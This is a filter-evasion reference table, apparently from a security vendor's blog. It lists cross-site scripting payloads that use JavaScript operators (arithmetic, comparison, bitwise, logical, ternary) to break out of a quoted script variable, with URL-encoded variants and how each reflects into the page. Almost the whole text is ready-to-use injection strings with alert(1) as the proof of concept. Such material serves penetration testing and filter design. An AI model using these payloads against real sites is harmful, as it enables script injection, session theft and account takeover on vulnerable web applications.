# https://www.whitehatsec.com/blog/filter-evasion-concatenation-javascript-operators/
                                                                  
Operator 	                          Injection 	                   Reflection (<script>x=")
--------------------------------   ----------------------------  ------------------------------------------
Addition & String Concatenation 	 "%2balert(1)%2b" 	           <script>x=""+alert(1)+"";y=42;</script>
Subtraction 	                      "-alert(1)-" 	               <script>x=""-alert(1)-"";y=42;</script>
Multiplication 	                    "*alert(1)*" 	               <script>x=""*alert(1)*"";y=42;</script>
Division 	                          "/alert(1)/" 	               <script>x=""/alert(1)/"";y=42;</script>
Modulus; %25 needs to reflect as %. "%25alert(1)%25" 	           <script>x=""%alert(1)%"";y=42;</script>
“Less Than” Comparison 	            "<alert(1)<" 	               <script>x=""<alert(1)<"";y=42;</script>
“Greater Than” Comparison 	        ">alert(1)>" 	               <script>x="">alert(1)>"";y=42;</script>
“Less Than or Equal To” Comparison 	"<=alert(1)<=" 	             <script>x=""<=alert(1)<="";y=42;</script>
“Greater Than or Equal To” Comparison ">=alert(1)>=" 	           <script>x="">=alert(1)>="";y=42;</script>
“Equal To” Comparison 	            "==alert(1)== " 	           <script>x=""==alert(1)=="";y=42;</script>
Strong-Typed “Equal To” Comparison 	"===alert(1)===" 	           <script>x=""===alert(1)==="";y=42;</script>
“Not Equal To” Comparison 	        "!=alert(1)!=" 	             <script>x=""!=alert(1)!="";y=42;</script>

Bitwise “and”;                      %26 needs to reflect as &. 	
                                   "%26alert(1)%26" 	           <script>x=""&alert(1)&"";y=42;</script>
Bitwise “or” 	                     "|alert(1)|" 	               <script>x=""|alert(1)|"";y=42;</script>
Bitwise “xor” 	                   "^alert(1)^" 	               <script>x=""^alert(1)^"";y=42;</script>
Bitwise Left Shift 	               "<<alert(1)<<" 	             <script>x=""<<alert(1)<<"";y=42;</script>
Bitwise Right Shift 	             ">>alert(1)>>" 	             <script>x="">>alert(1)>>"";y=42;</script>
Bitwise Right Shift With Zeros 	   ">>>alert(1)>>>" 	           <script>x="">>>alert(1)>>>"";y=42;</script>
Ternary Conditional Expression 	   "?alert(1):" 	               <script>x=""?alert(1):"";y=42;</script>

Logical “and”; %26 needs to reflect as &. 	
                                   "%26%26alert(1)%26%26" 	     <script>x=""&&alert(1)&&"";y=42;</script>
Logical “or”; Note: will only result in payload executing if preceding string is evaluated as “false” by the JS engine, like an empty string. 	
                                   "||alert(1)||" 	           <script>x=""||alert(1)||"";y=42;</script>